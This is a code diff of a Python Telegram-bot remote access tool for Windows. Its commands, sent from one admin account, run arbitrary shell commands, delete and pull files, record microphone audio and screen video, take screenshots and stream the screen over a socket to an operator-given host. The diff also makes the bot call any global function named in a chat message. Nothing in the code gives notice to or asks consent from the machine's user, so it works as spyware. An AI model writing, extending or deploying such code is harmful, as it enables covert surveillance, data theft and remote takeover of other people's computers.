@@ -15,24 +15,15 @@ from ctypes  import windll
 from telebot import TeleBot
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from PIL import Image
-import moviepy.editor as moviepy
 
 # Variables
+API_TOKEN = "token" 
 
-
-API_TOKEN = "token" # TEST
 ADMIN = <id>
 
 filename_audio = "recorded_audio.wav"
 filename_video = "video1.avi"
 filename_screenshot = "screenshot.jpg"
-
-while True:
-    if os.path.exists(filename_video):
-        index = filename_video[5:-4]
-        filename_video = filename_video[:-5] + str(int(index) + 1) + ".avi"
-    else:
-        break
 
 width = windll.user32.GetSystemMetrics(0)
 height = windll.user32.GetSystemMetrics(1)
@@ -51,11 +42,10 @@ bot.send_message(ADMIN, "ON ✅")
 markup = ReplyKeyboardMarkup(True, True)
 markup.add(KeyboardButton("cd"), KeyboardButton("cd_path"),
            KeyboardButton("dir"), KeyboardButton("del"),
-           KeyboardButton("type"), KeyboardButton("get_file"),
-           KeyboardButton("exec_cmd"), KeyboardButton("record_audio"),
-           KeyboardButton("dump_audio"), KeyboardButton("record_video"),
-           KeyboardButton("get_video"), KeyboardButton("screenshot"),
-           KeyboardButton("screen_broadcast"))
+           KeyboardButton("get_file"), KeyboardButton("exec_cmd"), 
+           KeyboardButton("record_audio"), KeyboardButton("dump_audio"),
+           KeyboardButton("record_video"), KeyboardButton("get_video"),
+           KeyboardButton("screenshot"), KeyboardButton("getscreen"))
 
 
 # Fn(1)
@@ -111,7 +101,7 @@ def checkID(ms):
 
 
 # Fn(2)
-def cd():
+def cd(ms):
     output = os.getcwd()
     bot.send_message(ADMIN, output, reply_markup=markup)
 
@@ -137,15 +127,13 @@ def cd_path(ms):
 
     bot.register_next_step_handler(ms, exec_cd_path_next)
 
-def dir():
+def dir(ms):
     try:
         list_files = os.listdir(os.getcwd())
-        output = ""
-        for i in list_files:
-            output += f"{i}\n"
+        list_files = '\n'.join(list_files)
         
-        if output:
-            bot.send_message(ADMIN, output, reply_markup=markup)
+        if list_files:
+            bot.send_message(ADMIN, list_files, reply_markup=markup)
         else:
             bot.send_message(ADMIN, "<Empty>", reply_markup=markup)
     except Exception as e:
@@ -170,29 +158,6 @@ def del_file(ms):
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
     bot.register_next_step_handler(ms, del_file_next)
-
-def type(ms):
-    markup_type = ReplyKeyboardMarkup()
-    create_markup(markup_type)
-    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_type)
-    
-    @bot.message_handler(content_types=["text"])
-    def exec_type_next(ms):
-        if ms.text != "None":
-            try:
-                path = ms.text
-                output = subprocess.check_output(f"type {path}", shell=True).decode("utf-8")
-                if output:
-                    bot.send_message(ADMIN, output)
-                else:
-                    bot.send_message(ADMIN, "<Empty>")
-            except Exception as e:
-                bot.send_message(ADMIN, f"Error:\n{e}")
-                
-        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
-        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
-
-    bot.register_next_step_handler(ms, exec_type_next)
 
 def get_file(ms):
     markup_file = ReplyKeyboardMarkup()
@@ -244,7 +209,7 @@ def exec_cmd(ms):
             if output:
                 bot.send_message(ADMIN, output, reply_markup=markup)
             else:
-                bot.send_message(ADMIN, "Empty", reply_markup=markup)
+                bot.send_message(ADMIN, "<Empty>", reply_markup=markup)
         except Exception as e:
             bot.send_message(ADMIN, f"Error:\n{e}")
 
@@ -273,7 +238,7 @@ def record_audio(ms):
 
         bot.register_next_step_handler(ms, record_audio_next)
 
-def dump_audio():
+def dump_audio(ms):
     with open("dump_record_audio.dat", "rb") as dump_in:
         unpickler = pickle.Unpickler(dump_in)
         frame = unpickler.load()
@@ -303,34 +268,28 @@ def dump_audio():
 def record_video(ms):
     bot.send_message(ADMIN, "Recording 🎲", reply_markup=markup)
     
-    out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))
     while True:
-        frame = pyautogui.screenshot()
-        frame = np.array(frame)
-        
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        out.write(frame)
+        stop_time = round(time.time()) + 70
 
-# def avi_to_mp4(ms):
-#     with open(filename_video, "rb") as video:
-#         bot.send_message(ADMIN, "convert to mp4...")
+        while os.path.exists(filename_video):
+            index = filename_video[5:-4]
+            filename_video = filename_video[:-5] + str(int(index) + 1) + ".avi"
 
-#         cv2.destroyAllWindows()
-#         out.release()
+        out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))
 
-#         clip = moviepy.VideoFileClip(filename_video)
-#         clip.write_videofile("recorded.mp4", logger=None)
-#         clip.close()
-    
-#         os.remove(filename_video)
-    
-#     with open("recorded.mp4", "rb") as video:
-#         bot.send_message(ADMIN, "Success ✅")
-#         bot.send_video(ADMIN, video)
+        while True:
+            if round(time.time()) == stop_time:
+                cv2.destroyAllWindows()
+                out.release()
+                break
+            
+            frame = pyautogui.screenshot()
+            frame = np.array(frame)
+            
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            out.write(frame)
 
-#     os.remove("recorded.mp4")
-
-def screenshot():
+def screenshot(ms):
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save("screenshot.jpg")
 
@@ -339,11 +298,11 @@ def screenshot():
     
     os.remove(filename_screenshot)
 
-def screen_broadcast(ms):
+def getscreen(ms):
     bot.send_message(ADMIN, "Enter port, ip...")
     
     @bot.message_handler(content_types=["text"])
-    def screen_broadcast_next(ms):
+    def getscreen_next(ms):
         try:
             list_data = ms.text.split()
             PORT = int(list_data[0])
@@ -363,19 +322,18 @@ def screen_broadcast(ms):
             bot.send_message(ADMIN, "Successful connection ✅")
             while True:
                 image = pyautogui.screenshot()
-                image = image.resize((1024, 576))
+                image = image.resize((1440, 900))
                 image = np.array(image)
-                img = Image.frombytes('RGB', (1024, 576), image)
+                img = Image.frombytes('RGB', (1440, 900), image)
                 data = pickle.dumps(np.array(img))
                 clientsocket.sendall(struct.pack("L", len(data)) + data)
         except Exception as e:
             bot.send_message(ADMIN, f"Error:\n{e}")
     
-    bot.register_next_step_handler(ms, screen_broadcast_next)
-
+    bot.register_next_step_handler(ms, getscreen_next)
 
 # Start
-@bot.message_handler(commands=["_start", "_help"])
+@bot.message_handler(commands=["_start"])
 def send_welcome(ms):
     if checkID(ms):
         bot.send_message(ADMIN, text="ㅤ", reply_markup=markup)
@@ -384,44 +342,11 @@ def send_welcome(ms):
 @bot.message_handler(content_types=["text"])
 def CheckCommand(ms):
     if checkID(ms):
-        if ms.text == "cd":
-            cd()
-
-        elif ms.text == "cd_path":
-            cd_path(ms)
-
-        elif ms.text == "dir":
-            dir()
-
-        elif ms.text == "del":
-            del_file(ms)
-        
-        elif ms.text == "type":
-            type(ms)
-        
-        elif ms.text == "get_file":
-            get_file(ms)
-
-        elif ms.text == "exec_cmd":
-            exec_cmd(ms)
-
-        elif ms.text == "record_audio":
-            record_audio(ms)
-
-        elif ms.text == "dump_audio":
-            dump_audio()
-
-        elif ms.text == "record_video":
-            record_video(ms)
-        
-        elif ms.text == "get_video":
-            get_video(ms)
-
-        elif ms.text == "screenshot":
-            screenshot()
-
-        elif ms.text == "screen_broadcast":
-            screen_broadcast(ms)
-
+        try:
+            globals()[ms.text](ms)
+        except KeyError:
+            bot.send_message(ADMIN, "Function not found")
+        except Exception as e:
+            bot.send_message(ADMIN, e)
 
 bot.infinity_polling()
